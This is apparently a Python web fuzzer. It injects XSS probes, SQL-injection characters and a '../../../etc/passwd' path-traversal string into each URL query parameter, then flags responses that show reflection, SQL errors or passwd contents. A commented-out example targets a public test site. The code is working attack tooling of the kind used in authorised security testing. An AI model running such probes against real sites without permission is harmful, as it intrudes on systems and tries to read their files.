from urllib.parse import urlparse,parse_qs
import urllib
import copy
import requests

xss_payloads = ['<xi4okv>', 'javascript::alert`1`']
sqli_payloads = ["%27","\\","/"]
lfi_payloads = ['../../../etc/passwd']


payloads = xss_payloads + sqli_payloads + lfi_payloads



def fuzz(url):
    check = []
    url = urllib.parse.unquote(url, encoding='utf-8', errors='replace')
    up = urlparse(url)
    try:
        if up.query == '':
            return
        for ext in ['.js','.jpg','.css','.gif','.png','.txt']:
            if ext in up.path:
                return
        print('fuzz ' + url)
    except:
        return
	
    query = parse_qs(up.query)


    #Fuzz
    for i in query:
        for j in payloads:
            queryCheck = copy.deepcopy(query)
            upCheck = copy.deepcopy(up)
            queryCheck[i][0] = j

            queryTarget = ''
            for i in queryCheck:
                data = i + '=' + queryCheck[i][0] + '&'
                queryTarget += data

            url = up.scheme + '://' + up.netloc + up.path + '?' + queryTarget

            check.append(url[:-1])

    for i in query:
        for j in payloads:
            queryCheck = copy.deepcopy(query)
            upCheck = copy.deepcopy(up)
            queryCheck[i][0] = urllib.parse.quote(j)

            queryTarget = ''
            for i in queryCheck:
                data = i + '=' + queryCheck[i][0] + '&'
                queryTarget += data

            url = up.scheme + '://' + up.netloc + up.path + '?' + queryTarget

            check.append(url[:-1])
    
    for url in check:
        try:
            text = requests.get(url,timeout=5).text
            for i in xss_payloads:
                if i in text:#and 'text' in text.headers['Content-Type']:
                    print ("XSS ==> " + url)
            if 'SQL syntax' in text or 'mysql_fetch' in text:
                print("SQLi ==> " + url)
            if 'root:/root:' in text:
                print("LFI ==> " + url)
        except:
            pass


#fuzz("http://testphp.vulnweb.com/artists.php?artist=3")
